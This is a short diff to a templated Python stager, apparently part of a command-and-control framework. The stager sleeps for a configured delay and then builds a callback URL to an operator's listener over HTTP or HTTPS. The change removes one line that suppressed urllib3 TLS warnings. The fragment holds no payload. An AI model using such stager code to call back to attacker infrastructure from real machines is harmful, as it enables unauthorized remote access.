@@ -45,7 +45,6 @@ elif operating_system == 'Darwin':
 time.sleep({{stager.delay}})
 {% if stager.listener.ssl %}
 URL = "https://{{stager.listener.address}}:{{stager.listener.port}}/"
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 {% else %}
 URL = "http://{{stager.listener.address}}:{{stager.listener.port}}/"
 {% endif %}
